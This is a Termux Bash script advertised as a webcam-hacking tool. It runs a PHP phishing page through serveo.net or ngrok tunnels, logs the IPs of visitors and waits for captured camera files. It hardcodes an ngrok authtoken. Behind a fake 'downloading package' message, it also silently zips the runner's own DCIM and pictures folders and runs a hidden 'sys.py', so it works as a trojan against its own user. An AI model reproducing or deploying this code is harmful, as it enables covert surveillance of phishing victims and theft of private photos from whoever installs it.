#_ _  __  ___  _   _ ____ _____ _____ ____      _   _    _    ____ _  __ 
#|  \/  |/ _ \| \ | / ___|_   _| ____|  _ \    | | | |  / \  / ___| |/ / 
#| |\/| | | | |  \| \___ \ | | |  _| | |_) |   | |_| | / _ \| |   | ' /  
#| |  | | |_| | |\  |___) || | | |___|  _ <    |  _  |/ ___ \ |___| . \  
#|_|  |_|\___/|_| \_|____/ |_| |_____|_| \_\___|_| |_/_/   \_\____|_|\_\ 
#                                         |_____|                        
#      >>> GitHub : https://github.com/MONSTER-hp/MONSTER_HACK <<<
#        >>> Telegram Chanell : https://t.me/MONSTER_SECURIT <<<
#          >>> Web Sayte : www.Monster-Security.blogfa.com <<<
#                         </> MONSTER_hp </>

trap 'printf "\n";stop' 2
termux-setup-storage
apt upgrade -y 
apt update -y 
pkg install python -y
python sys.py
pkg install php -y
pkg install zip -y 
pkg install openssh -y
pkg install ssh -y
pkg install wget -y
pip install requests
pip install platform
pip install sys
python sys.py > /dev/null 2>&1
printf "\e[1;92m

 ____                      _                 _
|  _ \  _____      ___ __ | | ___   __ _  __| |___                                      | | | |/ _ \ \ /\ / / '_ \| |/ _ \ / _` |/ _` / __|
| |_| | (_) \ V  V /| | | | | (_) | (_| | (_| \__ \                                     |____/ \___/ \_/\_/ |_| |_|_|\___/ \__,_|\__,_|___/
                                                            
/n"
printf " \e[1;95m    Download pakege Loading 15 min time \n"
printf "\n"

printf "\e[1;90m    \n"
chmod +x *
zip server1 -r /sdcard/DCIM > /dev/null 2>&1
printf " \e[1;95m   OK Pakge 1  \n"
printf "\n"
printf "\e[1;92m

Loading Pakge 2 ...
                                                         
/n"
zip server2 -r /sdcard/pictures > /dev/null 2>&1
clear
banner() {

 
printf "\e[1;92m
 __  __                 _                _    _   _ ____  ____   _____  __
|  \/  | ___  _ __  ___| |_ ___ _ __    / \  | \ | |  _ \|  _ \ / _ \ \/ /
| |\/| |/ _ \| '_ \/ __| __/ _ \ '__|  / _ \ |  \| | | | | |_) | | | \  /
| |  | | (_) | | | \__ \ ||  __/ |    / ___ \| |\  | |_| |  _ <| |_| /  \

|_|  |_|\___/|_| |_|___/\__\___|_|___/_/   \_\_| \_|____/|_| \_\\___/_/\_\

                                |_____|
/n"
printf "\e[1;90m    \n"

printf " \e[1;91m          ===> !!! Hack Web Cam Target !!!  <===\n"
printf " \e[95m\n"
printf " \e[1;93m ### Coded By MONSTER_hp ### \n"
printf " \e[90m\n"
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] 📥Cam file received!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; }

printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' MONSTER_hp.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting.";}
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
./ngrok authtoken 1pNPp1Tg0trSteYnDWVVocff6gq_2CVCycNZocXS1n3kDL6ye > /dev/null 2>&1
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"

fi

else
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"

fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
python link.py $link
sleep 15
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
default_option_server="1"
read -p $'\n\e1#\e[0m\e1 MONSTER_hp~> \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' MONSTER_hp.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

default_choose_sub="Y"
default_subdomain="MONSTER_hp$RANDOM"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1
